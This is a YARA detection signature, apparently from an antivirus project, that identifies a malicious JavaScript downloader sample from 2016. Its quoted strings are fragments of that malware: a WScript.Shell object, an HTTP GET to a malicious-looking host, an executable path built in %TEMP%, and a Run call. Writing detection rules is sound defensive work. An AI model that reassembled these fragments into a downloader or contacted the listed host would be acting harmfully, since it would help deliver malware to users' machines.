rule sig_20160330_ff5c283c7bac13df2d2e9cd5e0c1efeb {
  meta:
    description = "datamaliciousorder - file 20160330_ff5c283c7bac13df2d2e9cd5e0c1efeb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "71e9a503b8eae8e5ea0ed73b212c96a3f0b9f97052dde0946065c2907e1ff9eb"

  strings:
    $s1  = "_ID[_N0](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s2  = "function _NW(_D0, _I0){_H0 = _H0 * 1; return _D0 - _I0;};" fullword ascii
    $s3  = "var _Y1 = function _N() {return WScript[_GI](\"WScript\"+\".Shell\");}(), _ES = 11;" fullword ascii
    $s4  = "if (_ID[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _TY(){return _SG + \"\";};" fullword ascii
    $s6  = "function _Y() {return _Y1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1VntiVE4W.ex\" + \"e\";};" fullword ascii
    $s7  = "function _E() {return ((_CD == true) && (_CD == _PF)) ? 1 : _H0;};" fullword ascii
    $s8  = "function _Z(_RF){_Y1[\"Run\"](_RF, _H0, _H0);};" fullword ascii
    $s9  = " while (_P){" fullword ascii
    $s10 = "function _WM(){return _GI;};" fullword ascii
    $s11 = "return _NW(_J0, _UZ);" fullword ascii
    $s12 = "function _YM()" fullword ascii
    $s13 = "var _D = new this[\"Date\"]();" fullword ascii
    $s14 = "function _H(_S) {var _YR = (1, 2, 3, 4, 5, _S); return _YR;};" fullword ascii
    $s15 = "function _LK(){return 22;};" fullword ascii
    $s16 = "var _R = false;" fullword ascii
    $s17 = "var _CD = false;" fullword ascii
    $s18 = "var _PF = false;" fullword ascii
    $s19 = "_CD = true; " fullword ascii
    $s20 = "_PF = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}